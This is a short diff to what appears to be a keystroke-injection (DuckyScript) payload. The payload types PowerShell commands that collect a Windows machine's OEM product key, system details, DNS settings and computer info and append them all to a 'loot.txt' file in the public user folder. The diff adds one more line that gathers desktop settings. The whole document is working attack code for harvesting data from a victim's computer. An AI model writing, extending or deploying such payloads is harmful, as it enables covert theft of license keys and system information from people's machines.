@@ -23,6 +23,7 @@ DELAY 500
 STRINGLN
 Get-CimInstance -ClassName SoftwareLicensingService | Select-Object -ExpandProperty OA3xOriginalProductKey | Out-File C:\Users\Public\loot.txt -Force -append
 Get-CimInstance -ClassName Win32_ComputerSystem | Out-File C:\Users\Public\loot.txt -Force -append
+Get-CimInstance -ClassName Win32_Desktop | Out-File C:\Users\Public\loot.txt -Force -append
 systeminfo | Out-File C:\Users\Public\loot.txt -Force -append
 Get-DnsClient | Out-File C:\Users\Public\loot.txt -Force -append
 Get-ComputerInfo | Out-File C:\Users\Public\loot.txt -Force -append
